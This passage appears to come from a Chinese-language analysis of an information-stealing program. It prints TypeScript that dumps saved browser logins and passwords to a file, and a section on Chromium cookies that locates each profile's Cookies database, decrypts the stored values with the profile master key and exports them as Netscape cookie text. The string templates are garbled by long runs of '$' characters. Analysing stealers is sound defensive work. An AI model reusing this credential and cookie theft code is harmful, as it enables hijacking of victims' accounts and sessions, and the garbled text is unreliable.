                      `Browser: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${browserName}\n` +   
                      `URL: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${login.origin_url}\n` +   
                      `Username: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${login.username_value}\n` +   
                      `Password: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${password}\n` +   
                      `Date Created: $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${formattedDate}\n`   
                    );   
                  }   
                } catch {   
                  // 单个条目处理失败时跳     
                }   
              }   
            } catch {   
              // 浏览器或配置文件处理失败时跳     
            } finally {   
              if (db) {   
                try {   
                  db.close();   
                } catch {   
                  // 关闭数据库失败时跳过   
                }   
              }   
            }   
          }   
        }   
         
        // 将所有结果写入文     
        if (results.length) {   
          await options.fileSystem.appendFile(   
            passwordFile,   
            Buffer.from(results.join(""), "utf8")   
          );   
        }   
      } catch {   
        // 整体处理失败时静默处     
      }   
    }
```

**5.2 Chromium Cookie**

**功能解析：**

1. 定位 Chromium Cookie 数据库

2. 查询 host/path/name/expiry/encrypted value

3. 解密 Cookie 值

4. 以接 Netscape Cookie 文本格式导出

**运行结果：**

● 产生网站登录 / 会话 Cookie 导出

**读取目标 / 请求目标：**

<Browser>\User Data\<Profile>\Network\Cookies

**动态参数：**

● 目标数据库路径模式：

○ <Browser>\User Data\<Profile>\Network\Cookies

● 关键动态依赖：

○ encrypted\_value

○ 对应 profile masterKey

**参数：**

● profiles

○ 浏览器名、Profile 名、Cookie DB 路径、解 key

● queryCookieRows

○ 读取 Cookie

● decryptChromiumSecret

○ 解密 encrypted\_value

● appendArtifact

○ 写入归档文件

**代码：**

```
/**   
     * 读取 Cookie DB 并按 profile 导出     
     */   
    async function collectChromiumCookiesByProfileName(profiles: Array<{ browserName: string; profileName: string; cookieDbPath: string; masterKey: Buffer }>, deps) {   
      for (const profile of profiles) {   
        try {   
          // 读取当前 profile  Cookie 数据     
          const rows = await deps.queryCookieRows(profile.cookieDbPath);   
         
          // 每条 Cookie 都要 encrypted_value 解成明文   
          const text = rows   
            .map((row) => {   
              const value = deps.decryptChromiumSecret(row.encrypted_value, profile.masterKey);   
              return [row.host_key, "TRUE", row.path, row.is_secure ? "TRUE" : "FALSE", row.expires_utc, row.name, value].join("\t");   
            })   
            .join("\n");   
         
          // 按浏览器 profile 维度落成 Cookie 文本   
          await deps.appendArtifact(`Cookies/$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${profile.browserName}_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$